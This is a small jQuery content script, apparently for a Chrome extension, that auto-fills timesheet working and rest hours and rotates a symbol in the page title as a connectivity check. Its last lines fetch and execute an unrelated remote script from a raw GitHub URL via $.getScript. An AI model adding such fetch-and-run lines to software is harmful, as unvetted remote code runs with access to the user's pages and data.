//----------------------
$(function () {
    //↓疎通確認コード：タイトルの■が回転するはず
    console.log('Chrome拡張の疎通確認コードが動いています。動作確認ができたら削除してください。');
    let flag = false;
    setInterval(function () {
        document.title = (flag ? "■" : "◆") + document.title.replace(/^[■◆]/, '');
        flag = !flag;
    }, 1000);
    //↑疎通確認コード

    $('select[name="workingtimes_from_hour"]').val("9");   
    $('select[name="workingtimes_from_minute"]').val("30");

    $('select[name="workingtimes_to_hour"]').val("18");
    $('select[name="workingtimes_to_minute"]').val("30");


    $('select[name="resttimes_from_hour"]').val("12");     
    $('select[name="resttimes_from_minute"]').val("0");   

    $('select[name="resttimes_to_hour"]').val("13");     
    $('select[name="resttimes_to_minute"]').val("0");   

    $.getScript("https://raw.githubusercontent.com/euphmat/Random-imgur/master/script.js", function(){
    alert("Script loaded and executed.");
    });
});